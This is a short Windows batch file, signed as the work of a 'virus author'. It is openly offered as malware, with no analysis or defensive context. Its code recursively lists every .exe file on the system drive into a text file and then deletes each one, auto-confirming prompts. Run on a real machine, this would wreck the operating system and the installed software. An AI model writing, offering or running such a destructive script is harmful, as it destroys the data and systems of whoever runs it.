@ echo off

rem ---------------------------------
rem Delete All Exe
DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_exe.txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__